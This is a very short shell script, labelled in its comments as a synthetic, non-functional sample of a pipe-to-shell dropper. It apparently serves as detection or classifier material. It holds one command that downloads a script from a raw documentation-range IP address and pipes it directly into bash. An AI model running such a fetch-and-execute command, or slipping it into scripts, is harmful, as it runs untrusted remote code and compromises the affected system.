#!/bin/sh
# Synthetic sample - pipe-to-shell dropper from raw IP (NON-FUNCTIONAL, doc IP)
# Family: curl|sh dropper (obfuscated: https transport + no space before bash)
curl -fsSL https://192.0.2.88/x|bash
